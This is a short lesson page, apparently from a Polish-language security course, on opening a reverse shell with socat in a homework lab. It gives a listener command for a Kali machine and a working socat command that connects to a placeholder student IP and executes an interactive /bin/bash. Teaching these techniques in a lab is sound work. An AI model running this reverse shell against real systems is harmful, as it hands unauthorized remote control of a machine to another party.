---
title: "6.4 - Reverse shell przez socat"
order: 4
---

```bash
#Kali (terminal 1): exit the 6.3 reverse shell first (if still connected)
socat file:`tty`,raw,echo=0 tcp-listen:12304

#Remote Shells HOMEWORK (terminal 2):
socat tcp-connect:[IP_STUDENTA]:12304 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```
